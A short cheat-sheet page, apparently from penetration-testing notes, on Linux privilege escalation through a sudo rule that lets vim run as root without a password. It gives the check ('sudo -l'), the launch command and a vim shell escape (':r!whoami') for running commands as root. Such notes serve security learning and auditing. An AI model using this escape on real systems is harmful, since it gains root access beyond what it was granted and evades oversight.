---
title: Sudo Vim Privilege Escalation
description: Sudo vim command might be vulnerable to privilege escalation (PrivEsc).
tags:
    - Privilege Escalation
refs:
date: 2023-02-05
draft: false
---

## Investigation

```sh
sudo -l

(ALL) NOPASSWD: vim example.txt
```

If we can execute **"vim"** command as root, we can execute the shell command in the vim editor.

<br />

## Exploitation

Simply run **"vim"** command as root.

```sh
sudo vim example.txt
```

In Vim editor, we can run shell commands as root.

```sh
:r!whoami
```